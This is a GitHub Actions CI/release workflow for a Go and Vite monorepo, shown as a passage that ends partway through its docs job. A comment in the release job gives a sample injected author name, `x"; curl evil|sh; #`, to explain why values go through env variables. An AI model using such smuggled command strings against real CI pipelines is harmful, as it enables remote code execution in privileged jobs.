name: ci

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

# Cancels superseded PR runs but never main-branch releases.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

jobs:
  # Config sanity ahead of everything else. `multicz validate --strict` catches
  # a component whose `paths` match nothing, a `bump_files` entry pointing at a
  # missing file or an unparseable version constant, a broken cascade edge, a
  # tag_format collision. Its own job rather than a step inside `detect`: those
  # are the failures that make `multicz changed` return a plausible-looking but
  # wrong answer, and a distinct red job names the cause instead of burying it
  # in the change-detection log.
  validate:
    name: validate
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/multicz-validate
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: validate
          body: "`multicz validate --strict` on `multicz.toml`."

  # Detect which components changed since the comparison ref. On PR: vs the
  # target branch. On main: vs each component's last tag (multicz default),
  # which scopes the release matrix to bump-worthy work. multicz is
  # language-agnostic: it reads multicz.toml `paths`, so it works on the Go
  # module just as it does on a Python workspace.
  #
  # Docs and integration detection bypass multicz on purpose: neither carries
  # a version of its own, so there is no tag for `multicz changed` to compare
  # against. We use a plain `git diff` on their paths instead.
  detect:
    name: detect changed components
    needs: validate
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      # Only this job's own duplicate-push check reads run history; nothing
      # else here needs more than the default contents:read.
      actions: read
    outputs:
      packages: ${{ steps.bypass.outputs.packages || steps.changed.outputs.packages }}
      has_package_changes: ${{ steps.bypass.outputs.has_package_changes || steps.changed.outputs.has_package_changes }}
      docs_changed: ${{ steps.bypass.outputs.docs_changed || steps.changed.outputs.docs_changed }}
      integration_changed: ${{ steps.bypass.outputs.integration_changed || steps.changed.outputs.integration_changed }}
      www_changed: ${{ steps.bypass.outputs.www_changed || steps.changed.outputs.www_changed }}
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # GitHub occasionally delivers the push webhook twice for one `git
      # push`, firing two independent runs of this workflow for the same
      # commit (seen on 647b8cd: two push-triggered runs, 17s apart, same
      # sha). The concurrency group below serializes them at the whole-
      # workflow level - a queued run's jobs, including this one, don't
      # start until the earlier run in the group finishes - so by the time
      # a duplicate's `detect` job runs, the earlier run's real conclusion
      # is already known. Only treat it as covering this commit when that
      # conclusion is success/neutral/skipped (or still null, for the
      # narrow window before serialization kicks in): a failed earlier
      # duplicate must not suppress the only real attempt at this commit.
      # Whichever eligible run has the lowest id is canonical; this only
      # ever adds a bypass (duplicate=false, the default, changes nothing)
      # - a failed or empty API read fails open rather than risk skipping a
      # real push's CI.
      - id: dedupe
        name: Detect a duplicate push-event delivery
        if: github.event_name == 'push'
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          ids=$(gh api "repos/${{ github.repository }}/actions/workflows/ci.yml/runs?event=push&head_sha=${{ github.sha }}&per_page=20" \
            --jq '[.workflow_runs[] | select(.conclusion == null or .conclusion == "success" or .conclusion == "neutral" or .conclusion == "skipped") | .id] | sort' 2>/dev/null || echo '[]')
          mine=${{ github.run_id }}
          first=$(echo "$ids" | jq -r '.[0] // empty')
          contains_mine=$(echo "$ids" | jq --argjson mine "$mine" 'any(. == $mine)')
          if [ "$contains_mine" = "true" ] && [ -n "$first" ] && [ "$first" != "$mine" ]; then
            echo "duplicate=true" >> "$GITHUB_OUTPUT"
            echo "## detect - duplicate push delivery" >> "$GITHUB_STEP_SUMMARY"
            echo "" >> "$GITHUB_STEP_SUMMARY"
            echo "Run \`$first\` already covers \`${{ github.sha }}\`; bypassing this one." >> "$GITHUB_STEP_SUMMARY"
          else
            echo "duplicate=false" >> "$GITHUB_OUTPUT"
          fi
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
          python-version: "3.12"
      - name: Install multicz
        run: uv tool install multicz
      # The `release` job pushes multicz's own chore(release) commit back to
      # main, which re-triggers this workflow. Everything in that commit is
      # generated (version constants, changelogs, state file) and every
      # artifact it names was already published by the run that created it, so
      # replaying the graph would rebuild byte-identical outputs and race the
      # release it descends from. Report an empty change set instead; every
      # gated job downstream skips, and detect itself still runs as a smoke
      # check. A duplicate push delivery (see `dedupe` above) short-circuits
      # exactly the same way - it is the same "this commit is already being
      # or has already been handled" situation, just with a different cause.
      - id: bypass
        name: Short-circuit multicz release commits and duplicate deliveries
        if: >-
          startsWith(github.event.head_commit.message, 'chore(release):')
          || steps.dedupe.outputs.duplicate == 'true'
        env:
          COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
          IS_RELEASE_COMMIT: ${{ startsWith(github.event.head_commit.message, 'chore(release):') }}
        run: |
          set -euo pipefail
          {
            echo "packages=[]"
            echo "has_package_changes=false"
            echo "docs_changed=false"
            echo "integration_changed=false"
            echo "www_changed=false"
          } >> "$GITHUB_OUTPUT"
          [ "$IS_RELEASE_COMMIT" = "true" ] || exit 0
          # multicz shapes the subject as
          # `chore(release): bump infra-api 0.1.1 -> 0.1.2, infra-cli ...`.
          # Split on the commas to render one bullet per component.
          subject=$(printf '%s\n' "$COMMIT_MESSAGE" | head -n1)
          {
            printf '## chore(release) - pipeline short-circuited\n\n'
            printf 'This run targets multicz'"'"'s own release commit (`%s`).\n' \
              "${GITHUB_SHA:0:7}"
            printf 'Binaries, `.deb` packages and GitHub Releases were already\n'
            printf 'produced by the `release` -> `publish` chain that authored it.\n\n'
            printf '### Versions published\n\n'
            printf '%s' "${subject#chore(release): bump }" \
              | tr ',' '\n' | sed -E 's/^ *//; s/^/- /'
            printf '\n\n### Skipped\n\n'
            printf 'Every quality, integration, release, publish and docs job\n'
            printf 'skips on this commit via the empty change set below.\n'
          } >> "$GITHUB_STEP_SUMMARY"
      - id: changed
        name: Compute changed components
        if: >-
          !startsWith(github.event.head_commit.message, 'chore(release):')
          && steps.dedupe.outputs.duplicate != 'true'
        run: |
          set -euo pipefail
          if [ "${{ github.event_name }}" = "pull_request" ]; then
            REF="origin/${{ github.base_ref }}"
            ALL=$(multicz changed --since "$REF" --output json | jq -c '.changed')
          else
            REF="each component's last tag"
            ALL=$(multicz changed --output json | jq -c '.changed')
          fi
          PACKAGES=$(echo "$ALL" | jq -c '.')
          echo "packages=$PACKAGES" >> "$GITHUB_OUTPUT"
          if [ "$PACKAGES" = "[]" ] || [ -z "$PACKAGES" ]; then
            echo "has_package_changes=false" >> "$GITHUB_OUTPUT"
          else
            echo "has_package_changes=true" >> "$GITHUB_OUTPUT"
          fi
          # Docs / integration detection via git diff (no tag exists for them).
          if [ "${{ github.event_name }}" = "pull_request" ]; then
            BASE="origin/${{ github.base_ref }}"
          elif git rev-parse --verify --quiet "${{ github.event.before }}^{commit}" > /dev/null 2>&1; then
            # Diff the whole pushed range, not just the last commit.
            BASE="${{ github.event.before }}"
          elif git rev-parse HEAD^ > /dev/null 2>&1; then
            BASE="HEAD^"
          else
            BASE="$(git hash-object -t tree /dev/null)"
          fi
          if git diff --quiet "$BASE" HEAD -- docs zensical.toml; then
            echo "docs_changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "docs_changed=true" >> "$GITHUB_OUTPUT"
          fi
          if git diff --quiet "$BASE" HEAD -- test/integration; then
            echo "integration_changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "integration_changed=true" >> "$GITHUB_OUTPUT"
          fi
          # Frontend detection: the Vite app has its own toolchain (Node), so it
          # is gated by a git diff on www/ rather than the Go matrix.
          if git diff --quiet "$BASE" HEAD -- www; then
            echo "www_changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "www_changed=true" >> "$GITHUB_OUTPUT"
          fi
          {
            echo "## Detected changes"
            echo ""
            echo "| Field | Value |"
            echo "| --- | --- |"
            echo "| Packages | \`$PACKAGES\` |"
            echo "| Reference | \`$REF\` |"
            echo "| Event | \`${{ github.event_name }}\` |"
          } >> "$GITHUB_STEP_SUMMARY"

  # Quality jobs run once over the whole Go module rather than per component:
  # the repo is a single `go` module, so `golangci-lint run`, `go vet` and
  # `go test ./...` already operate package-by-package and per-component
  # sharding would only add a brittle component->path lookup with no gain.
  # They gate on `has_package_changes` so docs-only / chore-only pushes skip.

  license-headers:
    name: license-headers
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/license-headers
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: license-headers
          body: SPDX headers on `cmd/`, `internal/`, `test/`, `scripts/`, `.github/`.

  lint:
    name: lint
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/golangci-lint
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: lint
          body: "`golangci-lint run` over the Go module."

  # Frontend quality gate (Node toolchain): lint, type-check, unit tests and a
  # production build of the Vite SPA. Gated on changes under www/.
  www:
    name: www
    needs: detect
    # Gated on www_changed alone: `go build ./...` in vet-build embeds only
    # cmd/www/dist/.gitkeep, never the real bundle, and `deb` rebuilds the SPA
    # from the current www/ tree on every run regardless of this job - so this
    # eslint/tsc/vitest gate has nothing to re-validate when www/ itself
    # hasn't changed. `release` and `docs`, which need this job, already
    # tolerate a skip.
    if: needs.detect.outputs.www_changed == 'true'
    runs-on: ubuntu-24.04
    steps:
      # fetch-depth: 0 + bump-preview: the production build below is stamped
      # with www/package.json's version, so without the preview a pull request
      # would validate a bundle carrying the previous release's number.
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/bump-preview
      - uses: ./.github/actions/www-quality
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: www
          body: "`eslint`, `tsc`, `vitest` with coverage (uploaded to Codecov) and a production `vite build` of the SPA."

  vet-build:
    name: vet + build
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # Compile against the version the next release will ship, not the last
      # one: `cmd/<component>/version.go` is a bump_files target.
      - uses: ./.github/actions/bump-preview
      - uses: ./.github/actions/go-vet-build
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: vet + build
          body: "`go vet` (both build tags) and `go build ./...`."

  test:
    name: test
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/bump-preview
      - uses: ./.github/actions/go-test
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: test
          body: "`go test -race` with coverage, uploaded to Codecov."

  gosec:
    name: gosec
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/gosec
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: gosec
          body: "`gosec` static security analysis over the Go module."

  govulncheck:
    name: govulncheck
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/govulncheck
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: govulncheck
          body: "`govulncheck` against the Go vulnerability database, less the entries `osv-scanner.toml` accepts."

  osv-scanner:
    name: osv-scanner
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/osv-scanner
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: osv-scanner
          body: "`osv-scanner` on the `go.mod` dependency closure."

  # Privileged kernel-level integration suite (build tag `integration`). Runs
  # when any component changed OR the suite itself changed. NOTE: the real
  # netns / iptables / cgroups tests added from M3 need a privileged host
  # (root + CAP_NET_ADMIN); wire a self-hosted or privileged runner here then.
  # The M0 smoke test only proves the tag wires up, so a hosted runner suffices.
  integration:
    name: integration
    needs: detect
    if: >-
      needs.detect.outputs.has_package_changes == 'true'
      || needs.detect.outputs.integration_changed == 'true'
    runs-on: ubuntu-24.04
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: infra
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/integration-test
        with:
          postgres-dsn: postgres://postgres:postgres@localhost:5432/infra?sslmode=disable
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: integration
          body: |
            `go test -tags=integration` against a postgres service, with
            `/dev/kvm` opened up for the hypervisor tests. The kernel-level
            cases (bridge, firewall) self-skip without root.

  # ---------------------------------------------------------------------
  # Debian packaging chain. Every component except infra-spa ships as a .deb -
  # the SPA bundle is embedded into infra-www's binary rather than installed
  # on its own. The .deb the release publishes is the artifact this chain
  # cleared, not a rebuild of it.
  # ---------------------------------------------------------------------

  deb:
    name: deb (${{ matrix.component }})
    needs: [detect, lint, vet-build, test, gosec, govulncheck, osv-scanner]
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        component:
          - infra
          - infra-api
          - infra-idp
          - infra-exporter
          - infra-controller-manager
          - infra-agent
          - infra-container-init
          - terraform-provider-infra
          - infra-www
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # The .deb carries the version in its filename and its control file, so
      # it has to be the version the release will publish.
      - uses: ./.github/actions/bump-preview
      # All nine, every run: a component released by cascade needs a package
      # too, and `multicz changed` cannot tell us which those are.
      - uses: ./.github/actions/build-deb
        with:
          component: ${{ matrix.component }}
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: deb (${{ matrix.component }})
          body: amd64 package uploaded as `${{ matrix.component }}-deb`.

  deb-validate:
    name: deb-validate (${{ matrix.component }})
    needs: deb
    if: needs.deb.result == 'success'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      actions: write # delete the artifact of a package that fails validation
    strategy:
      fail-fast: false
      matrix:
        include:
          - component: infra
            has_unit: "false"
          - component: infra-container-init
            has_unit: "false"
          - component: terraform-provider-infra
            has_unit: "false"
          - component: infra-api
            has_unit: "true"
          - component: infra-idp
            has_unit: "true"
          - component: infra-exporter
            has_unit: "true"
          - component: infra-controller-manager
            has_unit: "true"
          # infra-agent reconciles kernel state, so its unit cannot take the
          # hardening the control-plane daemons do - see
          # deploy/systemd/infra-agent.service for which directives would
          # break which reconciler. 75 holds the line at its current 7.2
          # without pretending it can reach 1.1.
          - component: infra-agent
            has_unit: "true"
            security_threshold: "75"
          - component: infra-www
            has_unit: "true"
    steps:
      - uses: actions/checkout@v7
      # No probe, for the same reason as the sbom job: `deb` builds all eight
      # legs on every run, so a missing artifact means its leg failed - and
      # that already skips this job through `!failure()`.
      - uses: ./.github/actions/validate-deb
        with:
          component: ${{ matrix.component }}
          has-unit: ${{ matrix.has_unit }}
          security-threshold: ${{ matrix.security_threshold || '11' }}
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: deb-validate (${{ matrix.component }})
          body: |
            lintian (`--fail-on error`), `test/install/validate.sh` against the
            installed package, and `systemd-analyze security` at threshold
            `${{ matrix.security_threshold || '11' }}`.

  # ---------------------------------------------------------------------
  # End-to-end and DAST. Both bring the control plane up from source as plain
  # processes against PostgreSQL - the same five binaries `deploy/ansible`
  # installs as .debs, not a cluster nothing in this repo's own install path
  # uses. Each job starts its own stack: a shared one would make a ZAP failure
  # and an e2e failure indistinguishable, and the runners are parallel anyway.
  # ---------------------------------------------------------------------

  e2e:
    name: e2e
    needs: detect
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: infra
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/stack-up
        with:
          postgres-dsn: postgres://postgres:postgres@localhost:5432/infra?sslmode=disable
      - name: Run the end-to-end suite
        run: test/e2e/smoke.sh
      # stack-up dumps on its own failure; this covers a failure of the suite
      # itself, which runs after the stack is up.
      - name: Dump logs on failure
        if: failure()
        run: cat /tmp/stack-logs/*.log || true
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: e2e
          body: |
            infra-api, infra-controller-manager, infra-idp, infra-exporter and
            infra-www built from source and run against PostgreSQL, then
            `test/e2e/smoke.sh` over the API, identity provider, exporter and
            dashboard.

  owasp:
    name: owasp (${{ matrix.name }})
    needs: [detect, e2e]
    # has_package_changes is repeated from `e2e` on purpose: a skipped `needs`
    # does not skip the dependent job under `!cancelled() && !failure()`, so
    # without this a docs-only push would stand up two stacks to scan a
    # control plane nothing had changed.
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: infra
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 5
    strategy:
      fail-fast: false
      matrix:
        include:
          - name: api
            port: 8080
          - name: www
            port: 8088
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/stack-up
        with:
          postgres-dsn: postgres://postgres:postgres@localhost:5432/infra?sslmode=disable
      - uses: ./.github/actions/owasp-scan
        with:
          target: http://127.0.0.1:${{ matrix.port }}
          name: ${{ matrix.name }}
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: owasp (${{ matrix.name }})
          body: |
            ZAP baseline against `${{ matrix.name }}` on port
            `${{ matrix.port }}`, gated by `.zap/rules.tsv`. Full report in
            artifact `zap-${{ matrix.name }}`.

  # Release on main only. multicz bumps cmd/<dir>/version.go, writes
  # changelogs, creates the release commit and per-component tags, and pushes
  # back to main. Artifact distribution is handled by the `publish` job.
  release:
    name: release
    needs:
      - detect
      - license-headers
      - lint
      - www
      - vet-build
      - test
      - gosec
      - govulncheck
      - osv-scanner
      - integration
      - deb-validate
      - e2e
      - owasp
    # www is gated on www_changed, so it is skipped on non-frontend pushes. A
    # skipped need would skip release too, so tolerate skips (!cancelled) and
    # only block on real failures (!failure) rather than requiring success.
    if: >-
      !cancelled()
      && !failure()
      && github.event_name == 'push'
      && github.ref == 'refs/heads/main'
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    outputs:
      no_bumps: ${{ steps.bump.outputs.no_bumps }}
      bumped: ${{ steps.bump.outputs.bumped }}
      bumped_json: ${{ steps.bump.outputs.bumped_json }}
    steps:
      # `main-protection` (the repo ruleset) requires every change to main to
      # go through a pull request; the default GITHUB_TOKEN authenticates as
      # github-actions[bot], which has no bypass for it. RELEASE_PAT is the
      # maintainer's own PAT, the same identity auto-merge-signed.yml already
      # uses to push signed commits straight to main, and it does bypass the
      # ruleset.
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
          persist-credentials: true
          token: ${{ secrets.RELEASE_PAT || secrets.GITHUB_TOKEN }}
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
          python-version: "3.12"
      - name: Install multicz
        run: uv tool install multicz
      # The author name and email arrive through `env:`, never interpolated
      # into the script body. `${{ }}` is substituted before bash sees the
      # line, so a commit authored as `x"; curl evil|sh; #` would execute in a
      # job holding contents:write and the GPG key. Anyone able to land a
      # commit on main controls this string.
      - name: Configure git author
        env:
          AUTHOR_NAME: ${{ github.event.head_commit.author.name }}
          AUTHOR_EMAIL: ${{ github.event.head_commit.author.email }}
        run: |
          git config user.name  "${AUTHOR_NAME:-github-actions[bot]}"
          git config user.email "${AUTHOR_EMAIL:-41898282+github-actions[bot]@users.noreply.github.com}"
      - name: Detect GPG availability
        id: gpg
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
        run: |
          if [ -n "$GPG_PRIVATE_KEY" ] && [ -n "$GPG_PASSPHRASE" ]; then
            echo "available=true" >> "$GITHUB_OUTPUT"
          else
            echo "available=false" >> "$GITHUB_OUTPUT"
          fi
      - name: Import and unlock GPG key
        if: steps.gpg.outputs.available == 'true'
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
        run: |
          echo "$GPG_PRIVATE_KEY" | gpg --batch --import
          echo test | gpg --batch --yes --passphrase "$GPG_PASSPHRASE" \
            --pinentry-mode loopback --sign > /dev/null
          KEY_ID=$(gpg --list-secret-keys --with-colons \
            | awk -F: '/^sec/{print $5; exit}')
          git config user.signingkey "$KEY_ID"
      # Gate the bump on a non-empty plan. Without this the bump step runs on
      # every main push and has to be treated as "succeeded with no output",
      # which hides real failures behind the same empty-output signature.
      - name: Plan release
        id: plan
        run: |
          set -euo pipefail
          multicz plan \
            --summary "$GITHUB_STEP_SUMMARY" --output json > /tmp/plan.json
          if [ "$(jq '.bumps | length' /tmp/plan.json)" = "0" ]; then
            echo "release=false" >> "$GITHUB_OUTPUT"
            echo "no bumps pending"
          else
            echo "release=true" >> "$GITHUB_OUTPUT"
          fi
      - name: Bump, commit, tag, push
        id: bump
        if: steps.plan.outputs.release == 'true'
        run: |
          set -euo pipefail
          args=(bump --commit --tag --push
                --summary "$GITHUB_STEP_SUMMARY" --output json)
          # --sign covers both the release commit and the tags. Omitted rather
          # than passed false when no key is configured: the flag never
          # disables signing, so there is no negative form to pass.
          if [ "${{ steps.gpg.outputs.available }}" = "true" ]; then
            args+=(--sign)
          fi
          multicz "${args[@]}" | tee /tmp/bump.raw
          # multicz interleaves `post_bump: go mod tidy` progress lines on
          # stdout BEFORE the final JSON object, so the raw output is not
          # parseable as-is. Drop everything preceding the document's opening
          # brace, then assert the remainder really is JSON - an empty
          # `bumped` reads exactly like "nothing to release" downstream and
          # would silently skip publish + docs.
          sed -n '/^{/,$p' /tmp/bump.raw > /tmp/bump.json
          jq -e . /tmp/bump.json > /dev/null
          BUMPED=$(jq -r '.bumps | keys | join(" ")' /tmp/bump.json)
          BUMPED_JSON=$(jq -c '.bumps | keys' /tmp/bump.json)
          echo "bumped=$BUMPED" >> "$GITHUB_OUTPUT"
          echo "bumped_json=$BUMPED_JSON" >> "$GITHUB_OUTPUT"
          if [ -z "$BUMPED" ]; then
            echo "no_bumps=true" >> "$GITHUB_OUTPUT"
          else
            echo "no_bumps=false" >> "$GITHUB_OUTPUT"
          fi
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: release
          body: |
            Bumped: `${{ steps.bump.outputs.bumped || 'none' }}`. GPG signing:
            `${{ steps.gpg.outputs.available }}`. `multicz plan` and
            `multicz bump` append their own detail above.

  # Build and publish the bumped components: cross-compiled binaries and .deb
  # packages attached to a per-component GitHub Release. Matrix over each
  # bumped component so one failure does not abort the others.
  publish:
    name: publish (${{ matrix.component }})
    needs: [detect, release]
    if: >-
      github.event_name == 'push'
      && github.ref == 'refs/heads/main'
      && needs.release.result == 'success'
      && needs.release.outputs.no_bumps == 'false'
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        component: ${{ fromJson(needs.release.outputs.bumped_json) }}
    permissions:
      contents: write
      actions: write # delete the consumed CI artifacts
    steps:
      - uses: actions/checkout@v7
        with:
          ref: main
      # No build cache on the publish path. The Go and npm caches are written
      # by pull-request runs, so restoring one here would let a pull request
      # place bytes into a job that signs and pushes release artifacts. Publish
      # compiles from a clean checkout; the minutes are the price of that.
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: false
      - uses: actions/setup-node@v7
        with:
          node-version: 22
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
          python-version: "3.12"
      - name: Install multicz
        run: uv tool install multicz
      # Reuse the amd64 .deb the deb-validate chain already installed, started
      # and scored, instead of rebuilding it here. Rebuilding would publish a
      # package nothing had validated - identical in intent, unverified in
      # fact. A component bumped purely by cascade has no artifact (its own
      # paths did not change), so probe rather than assume.
      - id: has_deb
        name: Check for a validated .deb from this run
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          if gh api --paginate \
               "/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts?per_page=100" \
               --jq '.artifacts[].name' | grep -qx "${{ matrix.component }}-deb"; then
            echo "value=true" >> "$GITHUB_OUTPUT"
          else
            echo "value=false" >> "$GITHUB_OUTPUT"
            echo "no validated .deb for ${{ matrix.component }}; will build one"
          fi
      - uses: actions/download-artifact@v8
        if: steps.has_deb.outputs.value == 'true'
        with:
          name: ${{ matrix.component }}-deb
          path: dist
      - name: Build release binaries
        env:
          GH_TOKEN: ${{ github.token }}
          HAS_VALIDATED_DEB: ${{ steps.has_deb.outputs.value }}
        run: |
          set -euo pipefail
          component="${{ matrix.component }}"
          case "$component" in
            infra)                     dir=cli ;;
            terraform-provider-infra)  dir=provider ;;
            infra-*)                   dir="${component#infra-}" ;;
            *)                         echo "unknown component $component" >&2; exit 1 ;;
          esac
          # The web dashboard embeds the built SPA, so build the frontend first.
          if [ "$dir" = "www" ]; then
            ( cd www && npm ci && npm run build )
            find cmd/www/dist -mindepth 1 ! -name .gitkeep -delete
            cp -r www/dist/. cmd/www/dist/
          fi
          version=$(multicz get "$component")
          tag="${component}-v${version}"
          mkdir -p dist
          # infra-spa is the standalone SPA bundle (no Go binary): build it and
          # ship www/dist as a tarball release asset.
          if [ "$component" = "infra-spa" ]; then
            ( cd www && npm ci && npm run build )
            tar -czf "dist/infra-spa_${version}_dist.tar.gz" -C www/dist .
            ( cd dist && sha256sum infra-spa_${version}_* > "infra-spa_${version}_checksums.txt" )
            notes=$(multicz release-notes --tag "$tag" || echo "Release $tag")
            gh release create "$tag" --title "$tag" --notes "$notes" dist/infra-spa_${version}_*
            exit 0
          fi
          for platform in linux/amd64 linux/arm64; do
            os="${platform%/*}"; arch="${platform#*/}"
            out="dist/${component}_${version}_${os}_${arch}"
            CGO_ENABLED=0 GOOS="$os" GOARCH="$arch" \
              go build -ldflags='-s -w' -o "$out" "./cmd/${dir}/"
          done
          # arm64 is always built here: deb-validate installs and starts the
          # package on an amd64 runner, so an arm64 .deb cannot go through
          # those gates and is published on the strength of the shared build
          # script alone. amd64 is only rebuilt when the validated artifact is
          # missing.
          ARCH=arm64 ./packaging/build-debs.sh "$version" "$component"
          if [ "$HAS_VALIDATED_DEB" = "true" ]; then
            echo "publishing the validated amd64 .deb from deb-validate"
            ls -l "dist/${component}_${version}_amd64.deb"
          else
            ARCH=amd64 ./packaging/build-debs.sh "$version" "$component"
          fi
          ( cd dist && sha256sum ${component}_${version}_* > "${component}_${version}_checksums.txt" )
          ls -l dist
          notes=$(multicz release-notes --tag "$tag" || echo "Release $tag")
          gh release create "$tag" \
            --title "$tag" \
            --notes "$notes" \
            dist/${component}_${version}_*
      # The .deb is published and attested by deb-validate; keeping the run
      # artifact would leave a second, unreleased copy of it around for
      # anyone reading the run page to pick up by mistake.
      - name: Delete the consumed CI artifacts
        if: steps.has_deb.outputs.value == 'true'
        uses: geekyeggo/delete-artifact@176a747ab7e287e3ff4787bf8a148716375ca118 # v6.0.0
        with:
          name: ${{ matrix.component }}-deb
          failOnError: false
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: publish (${{ matrix.component }})
          body: |
            Cross-compiled `linux/amd64` + `linux/arm64`, packaged the `.deb`s
            and cut the GitHub Release for `${{ matrix.component }}`. Published
            the validated amd64 `.deb`: `${{ steps.has_deb.outputs.value }}`.

  # Build the Zensical site and deploy to GitHub Pages. Runs on either signal
  # that can change the published output: a direct edit under docs/ or
  # zensical.toml (`docs_changed`), or a release bump (the site embeds
  # version + changelog content, so every bump invalidates the rendered
  # output even when no markdown changed). Gating on `release.result ==
  # 'success'` alone, as this job used to, missed the first case entirely: a
  # docs-only push has no package changes, so `release` is skipped rather
  # than successful, and the site never rebuilt even though docs/ changed.
  #
  # `needs` repeats the quality-gate list `release` depends on rather than
  # just depending on `release` itself, because a skipped `release` does not
  # say whether those gates passed or never ran - and `docs_changed` must
  # not bypass a real failure among them.
  docs:
    name: docs
    needs:
      - detect
      - license-headers
      - lint
      - www
      - vet-build
      - test
      - gosec
      - govulncheck
      - osv-scanner
      - integration
      - deb-validate
      - e2e
      - owasp
      - release
    if: >-
      !cancelled()
      && !failure()
      && github.event_name == 'push'
      && github.ref == 'refs/heads/main'
      && (
        needs.detect.outputs.docs_changed == 'true'
        || (needs.release.result == 'success' && needs.release.outputs.no_bumps == 'false')
      )
    runs-on: ubuntu-24.04
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    permissions:
      contents: read
      pages: write
      id-token: write
    steps:
      - uses: actions/checkout@v7
        with:
          ref: main
      - uses: actions/configure-pages@v6
        with:
          enablement: true
